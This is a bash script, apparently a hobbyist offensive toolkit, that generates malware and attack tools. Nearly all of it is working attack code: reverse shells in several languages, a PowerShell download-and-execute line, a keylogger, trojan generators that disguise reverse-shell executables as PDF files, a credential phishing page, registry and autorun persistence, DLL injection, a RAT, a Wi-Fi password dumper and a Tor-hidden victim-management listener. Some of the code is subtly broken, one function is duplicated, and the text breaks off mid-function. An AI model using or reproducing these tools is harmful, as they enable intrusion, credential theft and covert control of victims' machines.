#!/bin/bash

display_kali_dragon() {
    art=(
        "__________                                      .__  __"         
        "\______   \__  _  ______             ________ __|__|/  |_  ____  "
        "|     ___/\ \/ \/ /    \   ______  /  ___/  |  \  \   __\/ __ \ "
        "|    |     \     /   |  \ /_____/  \___ \|  |  /  ||  | \  ___/" 
        "|____|      \/\_/|___|  /         /____  >____/|__||__|  \___  >"
        "                      \/               \/                    \/ "
    )
    
    # Define rainbow colors
    colors=(31 32 33 34 35 36 37)  # ANSI color codes for red, green, yellow, blue, magenta, cyan, white

    # Number of cycles
    cycles=3
    # Speed up the animation
    speed=0.005  # Decrease the sleep time for faster animation

    # Animate the rainbow colors for a specific number of cycles
    for ((c=0; c<cycles; c++)); do
        for i in {0..7}; do
            for line in "${art[@]}"; do
                color=${colors[$((i % ${#colors[@]}))]}
                echo -e "\033[${color}m$line\033[0m"
                sleep "$speed"  # Use faster speed
            done
            clear
        done
    done

    # Echo zeach line in a different rainbow color from top to bottom
    for index in "${!art[@]}"; do
        color=${colors[$((index % ${#colors[@]}))]}
        echo -e "\033[${color}m${art[index]}\033[0m"
    done
}

# Function to check dependencies
check_dependencies() {
    local dependencies=(gcc mingw-w64 msfvenom wireshark metasploit airgeddon upx)
    
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo "$dep is not installed."
            read -p "Would you like to install $dep? (y/n): " choice
            if [[ $choice == [Yy]* ]]; then
                if [[ "$OSTYPE" == "linux-gnu"* ]]; then
                    sudo apt-get install -y "$dep"
                    echo "$dep has been installed."
                elif [[ "$OSTYPE" == "darwin"* ]]; then
                    brew install "$dep"
                    echo "$dep has been installed."
                else
                    echo "Unsupported OS for installing $dep."
                fi
            else
                echo "Skipping installation of $dep."
            fi
        else
            echo "$dep is already installed."
        fi
    done
}



# Call the functions at the start of the script
check_dependencies
display_kali_dragon

# Function to generate a manually obfuscated DLL with randomization
generate_obfuscated_dll() {
    echo "Generating manually obfuscated DLL..."
    read -p "Enter the DLL name (without .dll extension): " dll_name
    obfuscated_code='using System; using System.Runtime.InteropServices; public class ObfuscatedDLL { [DllImport("user32.dll")] public static extern void MessageBox(IntPtr hWnd, string text, string caption, uint type); }'
    
    # Randomize names and classes for obfuscation
    obfuscated_code=$(echo "$obfuscated_code" | sed "s/ObfuscatedDLL/HiddenClass_$RANDOM/g; s/MessageBox/ShowMessage_$RANDOM/g; s/IntPtr/Pointer_$RANDOM/g")
    echo "$obfuscated_code" > "${dll_name}.dll"
    echo "Manually obfuscated DLL created: ${dll_name}.dll"
}

# Function to generate DLL using msfvenom with advanced encoding
generate_dll_with_msfvenom() {
    echo "Generating DLL with msfvenom..."
    read -p "Enter payload (e.g., windows/meterpreter/reverse_tcp): " payload
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f dll -e x86/shikata_ga_nai | base64 > payload.b64
    echo "DLL generated and encoded in Base64: payload.b64"
}

# Function to create an encrypted EXE loader with self-decrypting capabilities
create_encrypted_loader() {
    echo "Creating encrypted EXE loader..."
    read -p "Enter path to the payload to encrypt: " payload_file
    openssl enc -aes-256-cbc -salt -in "$payload_file" -out encrypted_payload.enc
    echo "Encrypted payload created: encrypted_payload.enc"

    # Self-decrypting loader using PowerShell
    cat <<EOF > loader.ps1
$encrypted_payload = [System.IO.File]::ReadAllBytes('encrypted_payload.enc')
$decrypted_payload = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.Aes]::Create().Decrypt($encrypted_payload))
Start-Process 'powershell.exe' -ArgumentList "-NoP -NonI -Exec Bypass -EncodedCommand $decrypted_payload"
EOF
    echo "Self-decrypting loader created: loader.ps1"
}

# Function to create a reverse shell using Ncat with random sleep and persistence
create_ncat_reverse_shell() {
    echo "Creating Ncat reverse shell with persistence..."
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    cat <<EOF > ncat_reverse_shell.bat
@echo off
:loop
timeout /t $((RANDOM % 10 + 5)) >nul && ncat $lhost $lport -e cmd.exe
goto loop
EOF
    echo "Reverse shell script with persistence created: ncat_reverse_shell.bat"
}

# Function to create a PowerShell reverse shell with advanced obfuscation
create_powershell_reverse_shell() {
    echo "Creating PowerShell reverse shell with advanced obfuscation..."
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    obfuscated_command="powershell -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://$lhost:$lport')"
    obfuscated_command=$(echo "$obfuscated_command" | sed 's/IEX/IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(")); [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(")))/')
    echo $obfuscated_command > powershell_reverse_shell.ps1
    echo "PowerShell reverse shell script created: powershell_reverse_shell.ps1"
}

# Function to create a Batch reverse shell with dynamic variable names
create_batch_reverse_shell() {
    echo "Creating Batch reverse shell with dynamic names..."
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    echo "@echo off" > batch_reverse_shell.bat
    echo "set LHOST=$lhost" >> batch_reverse_shell.bat
    echo "set LPORT=$lport" >> batch_reverse_shell.bat
    echo "timeout /t %random% %% 10 + 5 >nul && cmd.exe /c ncat %LHOST% %LPORT% -e cmd.exe" >> batch_reverse_shell.bat
    echo "Batch reverse shell script created: batch_reverse_shell.bat"
}

# Function to create a Python reverse shell with dynamic encoding
create_python_reverse_shell() {
    echo "Creating Python reverse shell with dynamic encoding..."
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    encoded_command=$(echo "import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('$lhost', $lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(['cmd.exe'])" | base64)
    cat <<EOF > python_reverse_shell.py
import base64
exec(base64.b64decode("$encoded_command"))
EOF
    echo "Python reverse shell script created: python_reverse_shell.py"
}

# Function to generate a keylogger with advanced techniques
generate_keylogger() {
    echo "Generating advanced keylogger..."
    cat <<EOF > keylogger.py
import pynput
import base64
import threading

def on_press(key):
    with open("log.txt", "a") as f:
        f.write(base64.b64encode(str(key).encode()).decode() + "\\n")

def start_listener():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

thread = threading.Thread(target=start_listener)
thread.start()
EOF
    echo "Advanced keylogger created: keylogger.py"
}

generate_trojan_executable_ssh() {
    echo "==============================="
    echo "  Advanced Trojan Generator"
    echo "==============================="
    
    read -p "Enter path to benign executable: " benign_file

    # Check if the benign file exists
    if [[ ! -f "$benign_file" ]]; then
        echo "Error: Benign file not found."
        return 1
    fi

    # Prompt for IP and Port
    read -p "Enter your SSH server IP address: " ssh_ip
    read -p "Enter your SSH port (default 2222): " ssh_port
    ssh_port=${ssh_port:-2222}
    read -p "Enter your SSH username: " ssh_user
    read -p "Enter your reverse shell listening port (e.g., 4444): " user_port

    # Confirm user input
    echo "You entered:"
    echo "SSH Server IP: $ssh_ip"
    echo "SSH Port: $ssh_port"
    echo "SSH Username: $ssh_user"
    echo "Reverse Shell Listening Port: $user_port"
    
    read -p "Is this correct? (y/n): " confirm
    if [[ "$confirm" != "y" ]]; then
        echo "Exiting the generator. Please restart and provide correct details."
        return 1
    fi

    # Define output filenames
    trojan_file="trojan.exe"         
    payload_file="payload.c"         
    compiled_payload="payload.exe"    

    # Create a simple reverse shell payload that will connect to the SSH server
    cat << EOF > "$payload_file"
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")

void decrypt(char *str) {
    for (int i = 0; str[i] != '\\0'; i++) {
        str[i] ^= 0xAA; // Simple XOR decryption
    }
}

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    // SSH IP and port as strings, encrypted using XOR
    char ssh_ip[] = {$(printf "%d, " ${ssh_ip//./,})};
    char port[] = {$(printf "%d, " $user_port)};

    decrypt(ssh_ip);
    decrypt(port);

    WSAStartup(MAKEWORD(2,2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = inet_addr(ssh_ip); // Decrypted SSH IP
    server.sin_family = AF_INET;
    server.sin_port = htons(*(unsigned short*)port); // Decrypted port

    connect(sock, (struct sockaddr *)&server, sizeof(server));
    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr
    execve("cmd.exe", NULL, NULL); // Open reverse shell
    closesocket(sock);
    WSACleanup();
    return 0;
}
EOF

    # Compile the payload
    echo "Compiling the payload..."
    gcc -o "$compiled_payload" "$payload_file" -lws2_32 -O2 -s
    if [[ $? -ne 0 ]]; then
        echo "Error: Failed to compile payload."
        return 1
    fi

    # Combine the benign executable and the compiled payload
    echo "Creating trojan executable..."
    cat "$benign_file" "$compiled_payload" > "$trojan_file"

    # Pack the trojan executable with UPX (optional)
    if command -v upx &> /dev/null; then
        echo "Packing the trojan executable with UPX..."
        upx --best "$trojan_file"
        if [[ $? -ne 0 ]]; then
            echo "Error: UPX failed to pack the executable."
            return 1
        fi
    else
        echo "Warning: UPX not found. Skipping packing."
    fi

    # Rename the trojan executable
    timestamp=$(date +%s)
    new_name="doc_$timestamp.pdf"
    mv "$trojan_file" "$new_name"

    # Clean up intermediate files
    rm "$payload_file" "$compiled_payload"

    echo "==============================="
    echo "Highly obfuscated trojan executable created: $new_name"
    echo "==============================="

    # Display connection info for the SSH server
    echo "To manage incoming connections from the trojan, connect via SSH:"
    echo "ssh -p $ssh_port $ssh_user@$ssh_ip"
}


# Function to generate a highly obfuscated trojan executable with user dialogue
generate_trojan_executable() {
    echo "==============================="
    echo "  Advanced Trojan Generator"
    echo "==============================="
    
    read -p "Enter path to benign executable: " benign_file

    # Check if the benign file exists
    if [[ ! -f "$benign_file" ]]; then
        echo "Error: Benign file not found."
        return 1
    fi

    # Prompt for IP and Port
    read -p "Enter your listening IP address (e.g., 127.0.0.1): " user_ip
    read -p "Enter your listening port (e.g., 4444): " user_port

    # Confirm user input
    echo "You entered:"
    echo "IP Address: $user_ip"
    echo "Port: $user_port"
    
    read -p "Is this correct? (y/n): " confirm
    if [[ "$confirm" != "y" ]]; then
        echo "Exiting the generator. Please restart and provide correct details."
        return 1
    fi

    # Define output filenames
    trojan_file="trojan.exe"         
    payload_file="payload.c"         
    compiled_payload="payload.exe"    

    # Create a simple reverse shell payload with string encryption
    cat << EOF > "$payload_file"
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")

void decrypt(char *str) {
    for (int i = 0; str[i] != '\\0'; i++) {
        str[i] ^= 0xAA; // Simple XOR decryption
    }
}

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    // Encrypted IP and Port
    char ip[] = {$(printf "%d, " ${user_ip//./,})}; // Use user-supplied IP
    char port[] = {$(printf "%d, " $user_port)}; // Use user-supplied port

    decrypt(ip);
    decrypt(port);
    
    WSAStartup(MAKEWORD(2,2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = inet_addr(ip); // Use decrypted IP
    server.sin_family = AF_INET;
    server.sin_port = htons(*(unsigned short*)port); // Use decrypted port

    connect(sock, (struct sockaddr *)&server, sizeof(server));
    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr
    execve("cmd.exe", NULL, NULL);
    closesocket(sock);
    WSACleanup();
    return 0;
}
EOF

    # Compile the payload with obfuscation options
    echo "Compiling the payload..."
    gcc -o "$compiled_payload" "$payload_file" -lws2_32 -O2 -s
    if [[ $? -ne 0 ]]; then
        echo "Error: Failed to compile payload."
        return 1
    fi

    # Combine the benign executable and the compiled payload
    echo "Creating trojan executable..."
    cat "$benign_file" "$compiled_payload" > "$trojan_file"

    # Pack the trojan executable with UPX
    if command -v upx &> /dev/null; then
        echo "Packing the trojan executable with UPX..."
        upx --best "$trojan_file"
        if [[ $? -ne 0 ]]; then
            echo "Error: UPX failed to pack the executable."
            return 1
        fi
    else
        echo "Warning: UPX not found. Skipping packing."
    fi

    # Rename the trojan executable
    timestamp=$(date +%s)              
    new_name="doc_$timestamp.pdf"      
    mv "$trojan_file" "$new_name"

    # Clean up intermediate files
    rm "$payload_file" "$compiled_payload"

    echo "==============================="
    echo "Highly obfuscated trojan executable created: $new_name"
    echo "==============================="
}


# Function to create a phishing page with embedded JavaScript
create_phishing_page() {
    echo "Creating phishing page with JavaScript..."
    read -p "Enter the URL to submit credentials: " submit_url
    cat <<EOF > phishing_page.html
<!DOCTYPE html>
<html>
<head>
    <title>Phishing Page</title>
    <script>
        function redirect() {
            window.location.href = "$submit_url";
        }
    </script>
    <meta http-equiv="refresh" content="5;url=$submit_url">
</head>
<body onload="redirect()">
    <h1>Please enter your credentials</h1>
    <form action="$submit_url" method="post">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <input type="submit" value="Submit">
    </form>
</body>
</html>
EOF
    echo "Phishing page created: phishing_page.html"
}

# Function to generate a Windows service payload with encrypted storage
generate_windows_service_payload() {
    echo "Generating Windows service payload with encrypted storage..."
    read -p "Enter service name: " service_name
    read -p "Enter path to executable: " exe_path
    sc create "$service_name" binPath= "$exe_path" start= auto
    echo "Windows service created: $service_name"
}

# Function to create a payload for USB exploitation with autorun
create_usb_exploitation_payload() {
    echo "Creating payload for USB exploitation with autorun..."
    read -p "Enter the name of the executable to run (e.g., payload.exe): " exec_name
    cat <<EOF > autorun.inf
[autorun]
open=$exec_name
action=Run Payload
EOF
    echo "Autorun file created: autorun.inf"
}

# Function to generate a reverse HTTPS payload with additional obfuscation
generate_reverse_https_payload() {
    echo "Generating reverse HTTPS payload with obfuscation..."
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    encoded_command=$(echo "import requests; requests.get('https://$lhost:$lport')" | base64)
    cat <<EOF > reverse_https_payload.py
import base64
exec(base64.b64decode("$encoded_command"))
EOF
    echo "Reverse HTTPS payload created: reverse_https_payload.py"
}

# Function to create a payload with persistence through Windows Registry
create_persistence_payload() {
    echo "Creating payload with persistence..."
    read -p "Enter path to executable: " exe_path
    reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PersistentPayload" /t REG_SZ /d "$exe_path"
    echo "Persistence created for payload."
}

# Function to generate a fake update payload with user interaction
generate_fake_update_payload() {
    echo "Generating fake update payload..."
    cat <<EOF > fake_update.bat
@echo off
echo Updating system...
timeout /t 10 >nul
echo Update complete!
pause
EOF
    echo "Fake update payload created: fake_update.bat"
}

# Function to create a process injection payload with error handling
create_process_injection_payload() {
    echo "Creating process injection payload..."
    read -p "Enter target PID: " pid
    read -p "Enter DLL path: " dll_path
    cat <<EOF > process_injection.c
#include <windows.h>
#include <stdio.h>

void inject_dll(DWORD pid, const char *dll_name) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess) {
        void *pRemoteBuf = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dll_name, strlen(dll_name) + 1, NULL);
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"), pRemoteBuf, 0, NULL);
        WaitForSingleObject(hThread, INFINITE);
        VirtualFreeEx(hProcess, pRemoteBuf, MAX_PATH, MEM_RELEASE);
        CloseHandle(hProcess);
    }
}

int main() {
    DWORD pid = $pid; // Target PID
    const char *dll_name = "$dll_path";
    inject_dll(pid, dll_name);
    return 0;
}
EOF
    echo "Process injection payload created: process_injection_payload.c"
}

# Function to generate network scanning payload with stealth mode
generate_network_scanning_payload() {
    echo "Generating network scanning payload with stealth mode..."
    read -p "Enter target IP range (e.g., 192.168.1.0/24): " ip_range
    cat <<EOF > network_scan.py
import nmap

nm = nmap.PortScanner()
nm.scan('$ip_range', arguments='-sP -Pn')
for host in nm.all_hosts():
    print(f'Host: {host}, State: {nm[host].state()}')
EOF
    echo "Network scanning payload created: network_scan.py"
}

# Function to create a RAT with advanced C2 communication
create_rat() {
    echo "Creating RAT with advanced C2 communication..."
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    cat <<EOF > rat_server.py
import socket
import threading

def handle_client(client):
    while True:
        command = client.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        client.send(output.stdout + output.stderr)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('$lhost', $lport))
server.listen(5)

while True:
    client, addr = server.accept()
    print(f'Connection from {addr}')
    threading.Thread(target=handle_client, args=(client,)).start()
EOF
    echo "RAT server created: rat_server.py"
}

check_sysctl_conf() {
    if [ ! -f /etc/sysctl.conf ]; then
        echo "/etc/sysctl.conf does not exist. Would you like to create it? (y/n)"
        read create_conf
        if [ "$create_conf" = "y" ]; then
            sudo touch /etc/sysctl.conf
            echo "Created /etc/sysctl.conf."
            echo "Please add necessary configurations to it before proceeding."
            exit 1
        else
            echo "Exiting. Please create /etc/sysctl.conf manually to proceed."
            exit 1
        fi
    fi
}

start_airgeddon() {
    check_sysctl_conf
    echo "Put airgeddon in AutoStart? y/r (y = yes, r = remove from AutoStart)"
    echo "Press Enter to start airgeddon..."
    read air
    if [ "$air" = "y" ]; then
        sudo sh -c 'echo "airgeddon" >> ~/.bashrc'
        echo "Added airgeddon to AutoStart."
        echo "__________              ___.           "
        echo "\\______   \\ ____   _____\\_ |__   ______"
        echo " |    |  _//  _ \\ /     \\| __ \\ /  ___/"
        echo " |    |   (  <_> )  Y Y  \\ \\_\\ \\\\___ \\ "
        echo " |______  /\\____/|__|_|  /___  /____  > "
        echo "        \\/             \\/    \\/     \\/  "
    elif [ "$air" = "r" ]; then
        sudo sed -i '/airgeddon/d' ~/.bashrc
        echo "Removed airgeddon from AutoStart."
    fi

    sudo airgeddon
}

start_wireshark() {
    check_sysctl_conf
    echo "Put wireshark in AutoStart? y/r (y = yes, r = remove from AutoStart)"
    echo "Press Enter to start wireshark..."
    read wireshark_auto
    if [ "$wireshark_auto" = "y" ]; then
        sudo sh -c 'echo "wireshark" >> ~/.bashrc'
        echo "Added wireshark to AutoStart."
        echo "__________              ___.           "
        echo "\\______   \\ ____   _____\\_ |__   ______"
        echo " |    |  _//  _ \\ /     \\| __ \\ /  ___/"
        echo " |    |   (  <_> )  Y Y  \\ \\_\\ \\\\___ \\ "
        echo " |______  /\\____/|__|_|  /___  /____  > "
        echo "        \\/             \\/    \\/     \\/  "
    elif [ "$wireshark_auto" = "r" ]; then
        sudo sed -i '/wireshark/d' ~/.bashrc
        echo "Removed wireshark from AutoStart."
    fi
    sudo wireshark
}

start_metasploit_framework() {
    check_sysctl_conf
    echo "Put Metasploit in AutoStart? y/r (y = yes, r = remove from AutoStart)"
    echo "Press Enter to start Metasploit Framework..."
    read metasploit_auto
    if [ "$metasploit_auto" = "y" ]; then
        sudo sh -c 'echo "msfconsole" >> ~/.bashrc'
        echo "Added Metasploit to AutoStart."
        echo "__________              ___.           "
        echo "\\______   \\ ____   _____\\_ |__   ______"
        echo " |    |  _//  _ \\ /     \\| __ \\ /  ___/"
        echo " |    |   (  <_> )  Y Y  \\ \\_\\ \\\\___ \\ "
        echo " |______  /\\____/|__|_|  /___  /____  > "
        echo "        \\/             \\/    \\/     \\/  "
    elif [ "$metasploit_auto" = "r" ]; then
        sudo sed -i '/msfconsole/d' ~/.bashrc
        echo "Removed Metasploit from AutoStart."
    fi

    sudo msfconsole
}

start_anonsurf() {
    check_sysctl_conf
    # Check if anonsurf is installed
    if ! command -v anonsurf &> /dev/null; then
        echo "Anonsurf is not installed. Installing from GitHub..."
        git clone https://github.com/Und3rf10w/kali-anonsurf.git
        cd kali-anonsurf || exit
        sudo ./installer.sh
        cd ..
        echo "Anonsurf installed successfully."
    fi

    echo "Put anonsurf in AutoStart? y/r (y = yes, r = remove from AutoStart)"
    echo "Press Enter to start Anonsurf..."
    read anonsurf_auto
    if [ "$anonsurf_auto" = "y" ]; then
        sudo sh -c 'echo "anonsurf start" >> ~/.bashrc'
        echo "Added anonsurf to AutoStart."
        echo ".___ ___________   ____.___  _________._____________.____     ___________"
        echo "|   |\\      \\   \\ /   /|   |/   _____/|   \\______   \\    |    \\_   _____/"
        echo "|   |/   |   \\   Y   / |   |\\_____  \\ |   ||    |  _/    |     |    __)_ "
        echo "|   /    |    \\     /  |   |/        \\|   ||    |   \\    |___  |        \\"
        echo "|___\\____|__  /\\___/   |___/_______  /|___||______  /_______ \\/_______  /"
        echo "            \\/                     \\/             \\/        \\/        \\/ "
    elif [ "$anonsurf_auto" = "r" ]; then
        sudo sed -i '/anonsurf start/d' ~/.bashrc
        echo "Removed anonsurf from AutoStart."
    fi
    sudo anonsurf restart
    sudo anonsurf start
}

start_listener() {
  # Step 1: Define default values
  local SSH_PORT=2222
  local NEW_USER=""
  local CONNECTION_CACHE="/tmp/ssh_connections.cache"
  local clients=()

  # Step 2: Check if user wants to specify a custom SSH port
  read -p "Enter a custom SSH port (default is 2222) [Press Enter to use default]: " input_ssh_port
  if [ ! -z "$input_ssh_port" ]; then
    SSH_PORT=$input_ssh_port
  fi

  # Step 3: Get the username for the new non-root user
  read -p "Enter the username for the new non-root user: " NEW_USER
  if [ -z "$NEW_USER" ]; then
    echo "You must specify a username!"
    exit 1
  fi

  # Step 4: Check if user wants a specific Tor exit node
  read -p "Do you want to set a specific Tor exit node? (e.g. {us} or {no}) Leave blank for default [Press Enter]: " TOR_EXIT_NODE
  TOR_EXIT_NODE=${TOR_EXIT_NODE:-""}

  # Step 5: Update system packages
  echo "Updating system packages..."
  sudo apt-get update && sudo apt-get upgrade -y

  # Step 6: Install necessary packages (SSH, Tor, sudo, curl, gnupg)
  echo "Installing SSH, Tor, and other required packages..."
  sudo apt-get install -y openssh-server tor sudo curl gnupg

  # Step 7: Enable and start the SSH service
  echo "Enabling and starting SSH service..."
  sudo systemctl enable ssh
  sudo systemctl start ssh

  # Step 8: Harden SSH configuration with user-defined port
  echo "Configuring SSH for better security..."
  sudo sed -i "s/#Port 22/Port $SSH_PORT/" /etc/ssh/sshd_config
  sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
  sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
  sudo systemctl restart ssh

  echo "SSH configured. Ensure you have set up key-based authentication on port $SSH_PORT."

  # Step 9: Configure Tor for anonymous traffic routing
  echo "Configuring Tor for anonymous traffic routing..."
  sudo cp /etc/tor/torrc /etc/tor/torrc.bak
  echo -e "# SOCKS proxy for anonymous SSH access\nSocksPort 9050\nControlPort 9051" | sudo tee -a /etc/tor/torrc
  if [ ! -z "$TOR_EXIT_NODE" ]; then
    echo "ExitNodes $TOR_EXIT_NODE" | sudo tee -a /etc/tor/torrc
  fi

  # Step 10: Start Tor service
  echo "Starting Tor service..."
  sudo systemctl enable tor
  sudo systemctl start tor

  # Step 11: Install Anonsurf for full system-wide Tor routing (optional)
  echo "Installing Anonsurf to route all traffic through Tor..."
  git clone https://github.com/Und3rf10w/kali-anonsurf
  cd kali-anonsurf || exit
  sudo ./installer.sh

  # Step 12: Start Anonsurf to route all traffic through Tor
  echo "Starting Anonsurf to route all system traffic through Tor..."
  sudo anonsurf start

  # Step 13: Set up SSH over Tor (optional)
  echo "Setting up SSH through Tor using torsocks..."
  sudo apt-get install -y torsocks

  echo "To connect via SSH over Tor, use the following command on your client machine:"
  echo "torsocks ssh -p $SSH_PORT $NEW_USER@your_server_ip"

  # Step 14: Create a non-root user for SSH access
  echo "Creating a non-root user for SSH access..."
  sudo adduser "$NEW_USER"
  sudo usermod -aG sudo "$NEW_USER"

  echo "Non-root user created. Ensure you can SSH into this account using your SSH key."

  # Step 15: Configure firewall (optional, for enhanced security)
  echo "Setting up UFW firewall to only allow SSH and Tor..."
  sudo apt-get install -y ufw
  sudo ufw default deny incoming
  sudo ufw default allow outgoing
  sudo ufw allow "$SSH_PORT"/tcp # Allow custom SSH port
  sudo ufw allow 9050/tcp # Allow Tor SOCKS proxy
  sudo ufw enable

  echo "Firewall configured. Only SSH on port $SSH_PORT and Tor are allowed."
  echo "Your anonymous Debian server setup is complete!"

  # Step 16: Start listening for incoming connections
  start_connection_listener "$SSH_PORT" "$NEW_USER" "$CONNECTION_CACHE" clients
}

# Function to start listening for incoming SSH connections
start_connection_listener() {
  local port="$1"
  local user="$2"
  local cache_file="$3"
  local -n clients_ref="$4"

  # Create or clear the connection cache file
  : > "$cache_file"

  echo "Listening for incoming connections on port $port..."
  while true; do
    # Use netcat to listen for incoming SSH connections
    nc -lk "$port" | {
      read client_address
      echo "Connection received from: $client_address"
      echo "$client_address" >> "$cache_file"
      clients_ref+=("$client_address") # Add to clients array
      manage_clients clients_ref "$user"
    }
  done
}

# Function to manage connected clients
manage_clients() {
  local -n clients_ref="$1"
  local user="$2"

  while true; do
    echo "Connected clients:"
    for i in "${!clients_ref[@]}"; do
      echo "$((i + 1)). ${clients_ref[i]}"
    done

    echo "What do you want to do?"
    echo "1. Send command to a client"
    echo "2. Disconnect a client"
    echo "3. Add another client"
    echo "4. Exit client management"
    read -p "Select an option: " option

    case "$option" in
      1)
        read -p "Select client number to send command to: " client_num
        if [[ $client_num -gt 0 && $client_num -le ${#clients_ref[@]} ]]; then
          read -p "Enter the command to send: " command
          # Execute the command on the remote client (assumes SSH key authentication)
          ssh "${user}@${clients_ref[$((client_num - 1))]}" "$command"
        else
          echo "Invalid client number."
        fi
        ;;
      2)
        read -p "Select client number to disconnect: " client_num
        if [[ $client_num -gt 0 && $client_num -le ${#clients_ref[@]} ]]; then
          echo "Disconnecting client ${clients_ref[$((client_num - 1))]}..."
          unset 'clients_ref[$((client_num - 1))]' # Remove client from array
          clients_ref=("${clients_ref[@]}") # Re-index the array
        else
          echo "Invalid client number."
        fi
        ;;
      3)
        read -p "Enter the new client address: " new_client
        clients_ref+=("$new_client") # Add new client address to array
        echo "New client $new_client added."
        ;;
      4)
        echo "Exiting client management."
        break
        ;;
      *)
        echo "Invalid option. Please select again."
        ;;
    esac
  done
}

# Function to generate Wi-Fi password sniffer with stealth mode
generate_wifi_password_sniffer() {
    echo "Generating Wi-Fi password sniffer with stealth mode..."
    cat <<EOF > wifi_sniffer.py
import subprocess
import base64

def get_wifi_passwords():
    profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode().split("\\n")
    for profile in profiles:
        if "All User Profile" in profile:
            profile_name = profile.split(":")[1].strip()
            password_command = f"netsh wlan show profile {profile_name} key=clear"
            password_info = subprocess.check_output(password_command, shell=True).decode()
            for line in password_info.split("\\n"):
                if "Key Content" in line:
                    password = line.split(':')[1].strip()
                    encoded_password = base64.b64encode(password.encode()).decode()
                    print(f"SSID: {profile_name}, Password: {encoded_password}")

get_wifi_passwords()
EOF
    echo "Wi-Fi password sniffer created: wifi_sniffer.py"
}

# Function to generate a simple SQL injection script with additional checks
generate_sql_injection_script() {
    echo "Generating simple SQL injection script with checks..."
    read -p "Enter target URL: " target_url
    cat <<EOF > sql_injection.py
import requests

target_url = '$target_url'
payload = "' OR '1'='1"
response = requests.get(target_url + "?id=" + payload)

if "error" not in response.text:
    print("Injection successful!")
else:
    print("Injection failed.")
EOF
    echo "SQL injection script created: sql_injection.py"
}



# Function to generate a highly obfuscated trojan executable with user dialogue
generate_trojan_executable() {
    echo "==============================="
    echo "  Advanced Trojan Generator"
    echo "==============================="
    
    read -p "Enter path to benign executable: " benign_file

    # Check if the benign file exists
    if [[ ! -f "$benign_file" ]]; then
        echo "Error: Benign file not found."
        return 1
    fi

    # Prompt for IP and Port
    read -p "Enter your listening IP address (e.g., 127.0.0.1): " user_ip
    read -p "Enter your listening port (e.g., 4444): " user_port

    # Confirm user input
    echo "You entered:"
    echo "IP Address: $user_ip"
    echo "Port: $user_port"
    
    read -p "Is this correct? (y/n): " confirm
    if [[ "$confirm" != "y" ]]; then
        echo "Exiting the generator. Please restart and provide correct details."
        return 1
    fi

    # Define output filenames
    trojan_file="trojan.exe"         
    payload_file="payload.c"         
    compiled_payload="payload.exe"    

    # Create a simple reverse shell payload with string encryption
    cat << EOF > "$payload_file"
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")

void decrypt(char *str) {
    for (int i = 0; str[i] != '\\0'; i++) {
        str[i] ^= 0xAA; // Simple XOR decryption
    }
}

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    // Encrypted IP and Port
    char ip[] = {$(printf "%d, " ${user_ip//./,})}; // Use user-supplied IP
    char port[] = {$(printf "%d, " $user_port)}; // Use user-supplied port

    decrypt(ip);
    decrypt(port);
    
    WSAStartup(MAKEWORD(2,2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = inet_addr(ip); // Use decrypted IP
    server.sin_family = AF_INET;
    server.sin_port = htons(*(unsigned short*)port); // Use decrypted port

    connect(sock, (struct sockaddr *)&server, sizeof(server));
    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr
    execve("cmd.exe", NULL, NULL);
    closesocket(sock);
    WSACleanup();
    return 0;
}
EOF

    # Compile the payload with obfuscation options
    echo "Compiling the payload..."
